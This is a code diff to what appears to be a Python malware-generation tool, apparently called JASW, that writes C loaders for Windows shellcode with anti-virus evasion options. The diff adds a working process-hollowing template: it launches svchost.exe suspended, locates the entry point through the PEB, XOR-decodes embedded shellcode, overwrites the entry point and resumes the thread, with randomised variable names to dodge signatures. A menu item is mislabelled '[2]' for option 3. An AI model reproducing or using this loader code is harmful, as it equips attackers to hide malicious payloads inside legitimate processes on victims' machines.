@@ -14,12 +14,16 @@ def intro():
     from art import text2art
     print(text2art("JASW", "graffiti"))
     print()
-    print(emoji.emojize(":right_arrow:") + " " + emoji.emojize(":thumbs_up:") + " Many thanks to https://github.com/EnginDemirbilek/Flip")
-    print(emoji.emojize(":right_arrow:") + " " + emoji.emojize(":thumbs_up:") + " Many thanks to https://github.com/9emin1/charlotte")
-    print(emoji.emojize(":right_arrow:") + " " + emoji.emojize(":thumbs_up:") + " Many thanks to https://github.com/Arno0x/ShellcodeWrapper")
+    print(emoji.emojize(":right_arrow:") + " " + emoji.emojize(
+        ":thumbs_up:") + " Many thanks to https://github.com/EnginDemirbilek/Flip")
+    print(emoji.emojize(":right_arrow:") + " " + emoji.emojize(
+        ":thumbs_up:") + " Many thanks to https://github.com/9emin1/charlotte")
+    print(emoji.emojize(":right_arrow:") + " " + emoji.emojize(
+        ":thumbs_up:") + " Many thanks to https://github.com/Arno0x/ShellcodeWrapper")
     print(emoji.emojize(":right_arrow:") + " " + emoji.emojize(":thumbs_up:") + " All the guys everywhere")
     print()
     print(text2art("JASW", "efti_wall"))
+
 
 class Bypass:
     func_name = None
@@ -569,6 +573,86 @@ class Windows(ShellCoder):
         with open(self.shellcode_path, "rb") as raw_shellcode:
             return self.xor_shellcode(bytearray(raw_shellcode.read()), x_key)
 
+    def shellcode_process_hollowing(self, bypass_functions, bypass_calls, bypass_imports):
+        xor_key = self.make_random_str()
+        encoded_shellcode = self.open_shellcode(xor_key)
+        return """#include <windows.h>
+#include <winternl.h>
+{bypass_imports}
+
+#define CREATE_SUSPENDED 0x4
+#define PROCESSBASICINFORMATION 0
+
+{bypass_functions}
+
+int main(int argc, char **argv) {{
+    if ({bypass_calls}) {{
+        unsigned char {proc_addr}[0x8];
+        unsigned char {data_buf}[0x200];
+        STARTUPINFO {s_info};
+        PROCESS_INFORMATION {p_info};
+        BOOL {c_result} = CreateProcess(NULL, "c:\\\\windows\\\\system32\\\\svchost.exe", NULL, NULL,
+            FALSE, CREATE_SUSPENDED, NULL, NULL, &{s_info}, &{p_info});
+        PROCESS_BASIC_INFORMATION {pb_info};
+        ULONG {ret_len} = 0;
+        LONG {q_result} = NtQueryInformationProcess({p_info}.hProcess, ProcessBasicInformation, &{pb_info}, sizeof({pb_info}), &{ret_len});
+        PVOID {base_image_addr} = (PVOID)((ULONG64){pb_info}.PebBaseAddress + 0x10);
+        SIZE_T {bytes_rw} = 0;
+        BOOL {result} = ReadProcessMemory({p_info}.hProcess, {base_image_addr}, {proc_addr}, sizeof({proc_addr}), &{bytes_rw});
+        PVOID {executable_address} = (PVOID)(*(ULONG64*){proc_addr});
+        {result} = ReadProcessMemory({p_info}.hProcess, {executable_address}, {data_buf}, sizeof({data_buf}), &{bytes_rw});
+        ULONG {e_lfanew} = *(ULONG*)({data_buf} + 0x3c);
+        ULONG {rva_offset} = {e_lfanew} + 0x28;
+        ULONG {rva} = *(ULONG*)({data_buf} + {rva_offset});
+        PVOID {entrypoint_addr} = (PVOID)((ULONG64){executable_address} + {rva});
+        char {xor_var}[] = "{xor_key}";
+        char {shellcode_var}[] = "{encoded_shellcode}";
+        char {shellcode}[sizeof {shellcode_var}];
+        int {counter_var} = 0;
+        for(int {increment_var}=0; {increment_var} < sizeof {shellcode_var}; {increment_var}++) {{
+           if({counter_var} == sizeof {xor_var} -1) {{
+               {counter_var}=0;
+           }}
+           {shellcode}[{increment_var}] = {shellcode_var}[{increment_var}] ^ {xor_var}[{counter_var}];
+           {counter_var}++;
+        }}
+        {result} = WriteProcessMemory({p_info}.hProcess, {entrypoint_addr}, {shellcode}, sizeof({shellcode}), &{bytes_rw});
+        DWORD {r_result} = ResumeThread({p_info}.hThread);
+        WaitForSingleObject({p_info}.hProcess, INFINITE);
+        CloseHandle({p_info}.hProcess);
+        CloseHandle({p_info}.hThread);
+    }}
+}}
+        """.format(
+            bypass_imports=bypass_imports,
+            bypass_functions=bypass_functions,
+            bypass_calls=bypass_calls,
+            proc_addr=self.make_random_str(),
+            data_buf=self.make_random_str(),
+            s_info=self.make_random_str(),
+            p_info=self.make_random_str(),
+            c_result=self.make_random_str(),
+            pb_info=self.make_random_str(),
+            ret_len=self.make_random_str(),
+            q_result=self.make_random_str(),
+            base_image_addr=self.make_random_str(),
+            bytes_rw=self.make_random_str(),
+            result=self.make_random_str(),
+            executable_address=self.make_random_str(),
+            e_lfanew=self.make_random_str(),
+            rva_offset=self.make_random_str(),
+            rva=self.make_random_str(),
+            entrypoint_addr=self.make_random_str(),
+            xor_var=self.make_random_str(),
+            xor_key=xor_key,
+            shellcode_var=self.make_random_str(),
+            shellcode=self.make_random_str(),
+            encoded_shellcode=self.open_shellcode(xor_key),
+            counter_var=self.make_random_str(),
+            increment_var=self.make_random_str(),
+            r_result=self.make_random_str(),
+        )
+
     def shellcode_runner_template(self, bypass_functions, bypass_calls, bypass_imports):
         xor_var = self.make_random_str()
         xor_key = self.make_random_str()
@@ -785,10 +869,11 @@ int main(int argc, char **argv) {{
             cprint(" What injection technique do you want use?", "white", "on_blue")
             print(emoji.emojize(":right_arrow:") + " [1] - shellcode runner")
             print(emoji.emojize(":right_arrow:") + " [2] - process injection")
+            print(emoji.emojize(":right_arrow:") + " [2] - process hollowing")
 
             selected_answer = input(" ? ")
 
-            if selected_answer not in ("1", "2"):
+            if selected_answer not in ("1", "2", "3"):
                 selected_answer = None
 
         return selected_answer
@@ -798,7 +883,8 @@ int main(int argc, char **argv) {{
         select_bypass = []
 
         while select_answer is None:
-            cprint("Choose one or more anti-virus evasion techniques  (value separate by comma (eg: 1,3,4))", "white", "on_blue")
+            cprint("Choose one or more anti-virus evasion techniques  (value separate by comma (eg: 1,3,4))", "white",
+                   "on_blue")
 
             for i, bypass in enumerate(self.available_bypass):
                 print(emoji.emojize(":right_arrow:") + " [%s] %s" % ((i + 1), bypass.menu()))
@@ -837,8 +923,10 @@ int main(int argc, char **argv) {{
             template = self.shellcode_runner_template(bypass_functions, bypass_calls, bypass_imports)
         elif self.injection_technique == "2":
             template = self.process_injection_template(bypass_functions, bypass_calls, bypass_imports)
+        elif self.injection_technique == "3":
+            template = self.shellcode_process_hollowing(bypass_functions, bypass_calls, bypass_imports)
         else:
-            raise NotImplemented("Unknown technique")
+            raise NotImplemented("Unknown injection technique")
         self.template_path = "%s/template.c" % self.output_path
         self.write_template(template)
 
